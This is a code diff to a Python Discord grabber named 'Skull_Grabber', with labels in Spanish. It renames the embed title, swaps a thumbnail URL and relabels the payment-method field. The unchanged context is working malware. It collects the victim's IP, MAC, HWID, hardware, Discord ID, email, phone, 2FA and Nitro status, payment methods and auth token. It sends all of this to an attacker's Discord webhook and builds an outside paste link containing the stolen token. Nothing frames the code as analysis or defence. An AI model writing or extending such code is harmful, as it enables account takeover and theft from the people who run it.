@@ -161,7 +161,7 @@ class PcInfo:
 
     def get_inf(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-        embed = Embed(title="Test", color=5639644)
+        embed = Embed(title="Skull_Grabber", color=5639644)
 
         computer_os = platform.platform()
         cpu = wmi.WMI().Win32_Processor()[0]
@@ -172,7 +172,7 @@ class PcInfo:
             name="Informacion de el sistema",
             value=f'''💻 **Usuario PC:** `{username}`\n:desktop: **Nombre PC:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
             inline=False)
-        embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1054823728833368154/1054870816245956748/1.gif?size=4096")
 
         webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1054823728833368154/1054870816245956748/1.gif?size=4096", username="Skull_Grabber")
 
@@ -382,7 +382,7 @@ class Discord:
                     else:
                         methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Gmail:** `{email}`\n:mobile_phone: **Telefono:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Dinero:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Haz click para copiar!](https://paste-pgpj.onrender.com/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Gmail:** `{email}`\n:mobile_phone: **Telefono:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n💳 **Targetas de crédito:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Haz click para copiar!](https://paste-pgpj.onrender.com/?p={token})\n'
 
             if "code" in gift.text:
                 codes = json.loads(gift.text)
